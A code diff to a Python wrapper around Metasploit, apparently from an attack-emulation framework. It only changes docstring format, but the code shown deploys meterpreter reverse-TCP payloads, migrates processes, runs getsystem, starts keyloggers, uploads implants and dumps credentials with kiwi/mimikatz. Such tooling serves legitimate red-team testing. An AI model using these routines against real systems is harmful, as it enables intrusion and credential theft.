@@ -46,10 +46,10 @@ class Metasploit():
     def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler', lhost=None):
         """ Start a metasploit handler and wait for external payload to connect
 
-        @param payload: The payload being used in the implant
-        @param exploit: Normally the generic handler. Overwrite it if you feel lucky
-        @param lhost: the ip of the attack host. Use this to use the attacker ip as seen from the controller.
-        @:returns: res, which contains "job_id" and "uuid"
+        :param payload: The payload being used in the implant
+        :param exploit: Normally the generic handler. Overwrite it if you feel lucky
+        :param lhost: the ip of the attack host. Use this to use the attacker ip as seen from the controller.
+        :returns: res, which contains "job_id" and "uuid"
         """
         exp = self.get_client().modules.use('exploit', exploit)
         # print(exploit.description)
@@ -118,7 +118,7 @@ class Metasploit():
     def get_sid(self, session_number=0):
         """ Get the first session between hacked target and the metasploit server
 
-        @param session_number: number of the session to get
+        :param session_number: number of the session to get
         """
 
         self.wait_for_session()
@@ -128,7 +128,7 @@ class Metasploit():
     def get_sid_to(self, target):
         """ Get the session to a specified target
 
-        @param target: a target machine to find in the session list
+        :param target: a target machine to find in the session list
         """
 
         print(f"Sessions: {self.get_client().sessions.list}")
@@ -156,10 +156,10 @@ class Metasploit():
     def meterpreter_execute(self, cmds: list[str], session_number: int, delay=0) -> list[str]:
         """ Executes commands on the meterpreter, returns results read from shell
 
-        @param cmds: commands to execute, a list
-        @param session_number: session number
-        @param delay: optional delay between calling the command and expecting a result
-        @:return: the string results
+        :param cmds: commands to execute, a list
+        :param session_number: session number
+        :param delay: optional delay between calling the command and expecting a result
+        :return: the string results
         """
 
         shell = self.client.sessions.session(self.get_sid(session_number))
@@ -173,10 +173,10 @@ class Metasploit():
     def meterpreter_execute_on(self, cmds: list[str], target, delay=0) -> list[str]:
         """ Executes commands on the meterpreter, returns results read from shell
 
-        @param cmds: commands to execute, a list
-        @param target: target machine
-        @param delay: optional delay between calling the command and expecting a result
-        @:return: the string results
+        :param cmds: commands to execute, a list
+        :param target: target machine
+        :param delay: optional delay between calling the command and expecting a result
+        :return: the string results
         """
 
         session_id = self.get_sid_to(target)
@@ -198,7 +198,10 @@ class Metasploit():
         return res
 
     def smart_infect(self, target, **kwargs):
-        """ Checks if a target already has a meterpreter session open. Will deploy a payload if not """
+        """ Checks if a target already has a meterpreter session open. Will deploy a payload if not.
+
+        :param target: Infect the target
+        """
 
         # TODO Smart_infect should detect the platform of the target and pick the proper parameters based on that
 
@@ -310,7 +313,6 @@ class MSFVenom():
     def generate_and_deploy(self, **kwargs):
         """ Will generate the payload and directly deploy it to the target
 
-        :return:
         """
         self.generate_payload(**kwargs)
 
@@ -362,8 +364,9 @@ class MetasploitInstant(Metasploit):
 
     """
 
-    def parse_ps(self, ps_output):
+    def parse_ps(self, ps_output) -> list[dict]:
         """ Parses the data from ps
+
         :param ps_output: Metasploit ps output
         :return: A list of dicts
         """
@@ -398,9 +401,9 @@ class MetasploitInstant(Metasploit):
     def filter_ps_results(self, data, user=None, name=None, arch=None):
         """  Filter the process lists for certain
 
-        @param user: The user to filter for.
-        @param name: The process name to filter for (executable name)
-        @param arch: The architecture to select. 'x64' is one option
+        :param user: The user to filter for.
+        :param name: The process name to filter for (executable name)
+        :param arch: The architecture to select. 'x64' is one option
         """
 
         res = data
@@ -448,9 +451,9 @@ class MetasploitInstant(Metasploit):
     def migrate(self, target, user=None, name=None, arch=None):
         """  Migrate to a process matching certain criteria
 
-        @param user: The user to filter for.
-        @param name: The process name to filter for (executable name)
-        @param arch: The architecture to select. 'x64' is one option
+        :param user: The user to filter for.
+        :param name: The process name to filter for (executable name)
+        :param arch: The architecture to select. 'x64' is one option
         """
 
         ttp = "T1055"
@@ -525,8 +528,8 @@ class MetasploitInstant(Metasploit):
     def nslookup(self, target, target2, **kwargs):
         """ Do a nslookup discovery on the target
 
-        @param target: Command runs here
-        @param target2: This one is looked up
+        :param target: Command runs here
+        :param target2: This one is looked up
         """
 
         command = f"execute -f nslookup.exe -H -i -a '{target2.get_ip()}'"
@@ -563,8 +566,8 @@ class MetasploitInstant(Metasploit):
     def getsystem(self, target, variant=0, **kwargs):
         """ Do a network discovery on the target
 
-        @param target: Target to attack
-        @param variant: Variant of getsystem to use. 0 is auto, max is 3
+        :param target: Target to attack
+        :param variant: Variant of getsystem to use. 0 is auto, max is 3
         """
 
         command = "getsystem"
@@ -688,7 +691,7 @@ Do screen grabbing to collect data on target
 
         "winlogon.exe" will monitor user logins. "explorer.exe" during the session.
 
-        @param monitoring_time: Seconds the keylogger is running
+        :param monitoring_time: Seconds the keylogger is running
         """
 
         command = "keyscan_start"
@@ -801,8 +804,8 @@ Get basic system information
     def upload(self, target, src, dst, **kwargs):
         """ Upload file from metasploit controller to target
 
-        @param src: source file name on metasploit controller
-        @param dst: destination file name on target machine
+        :param src: source file name on metasploit controller
+        :param dst: destination file name on target machine
         """
 
         command = f"upload {src} '{dst}'  "
@@ -841,8 +844,8 @@ Uploading new files to the target. Can be config files, tools, implants, ...
     def kiwi(self, target, variant="creds_all", **kwargs):
         """ Kiwi is the modern equivalent to mimikatz
 
-        @param target: target being attacked
-        @param variant: kiwi command being used
+        :param target: target being attacked
+        :param variant: kiwi command being used
         """
 
         ttp = "t1003"
